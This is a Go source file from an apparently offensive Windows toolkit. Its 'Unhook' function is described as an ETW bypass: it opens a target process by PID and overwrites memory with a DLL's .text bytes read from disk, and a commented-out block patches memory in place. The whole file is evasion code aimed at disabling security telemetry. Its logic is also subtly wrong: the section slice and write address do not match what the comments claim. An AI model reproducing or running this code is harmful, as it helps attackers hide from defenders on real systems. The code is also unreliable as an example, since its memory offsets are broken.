package modules

import (
	"debug/pe"
	"errors"
	"fmt"
	"io/ioutil"
	"os"

	"golang.org/x/sys/windows"
)

// ETW bypass by injecting into the provided PID
// and overwriting the NTDLL.EtwEventWrite function
func Unhook(pid int, dll string) error {
	fmt.Printf("Reloading DLL: %s\n", dll)

	// Read the DLL from disk
	df, e := ioutil.ReadFile(dll)
	if e != nil {
		fmt.Printf("Error reading DLL: %s\n", dll)
		os.Exit(1)
	}
	f, e := pe.Open(dll)
	if e != nil {
		fmt.Printf("Error opening DLL: %s\n", dll)
		os.Exit(1)
	}

	// Get the .txt section from the DLL
	x := f.Section(".text")
	newBytes := df[x.Offset:x.Size]

	// Open handle to the process based on the PID
	// HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
	// dwDesiredAccess = PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020)
	// bInheritHandle = False
	// dwProcessId = PID
	procHandle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE, false, uint32(pid))

	if err != nil {
		rs := fmt.Sprintf("Error opening process with PID: %d\n", pid)
		return errors.New(rs)
	}

	/// Load the specified DLL into the process
	lazyDLL := windows.NewLazySystemDLL(dll)

	lbytes := uintptr(len(newBytes))

	// Write the payload
	// BOOL WriteProcessMemory(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(procHandle, uintptr(lazyDLL.Handle()), &newBytes[0], lbytes, &bytesWritten)
	if err != nil {
		rs := fmt.Sprintf("Failed to patch NTDLL.EtwEventWrite in process with PID: %d\n", pid)
		return errors.New(rs)
	}

	// Close the handle
	windows.Close(procHandle)

	/*
		t, e := windows.LoadDLL(pn)
		if e != nil {
			fmt.Println("Error loading DLL from disk")
			os.Exit(1)
		}
		h := t.Handle
		dllBase := uintptr(h)

		dllOffset := uint(dllBase) + uint(virtualoffset)

		var old uint32
		e = windows.VirtualProtect(uintptr(dllOffset), uintptr(len(b)), windows.PAGE_READWRITE, &old)
		if e != nil {
			fmt.Printf("Error changing memory protections")
			os.Exit(1)
		}

		fmt.Println("Made memory map RW")

		for i := 0; i < len(b); i++ {
			loc := uintptr(dllOffset + uint(i))
			mem := (*[1]byte)(unsafe.Pointer(loc))
			(*mem)[0] = b[i]
		}
	*/

	return nil
}
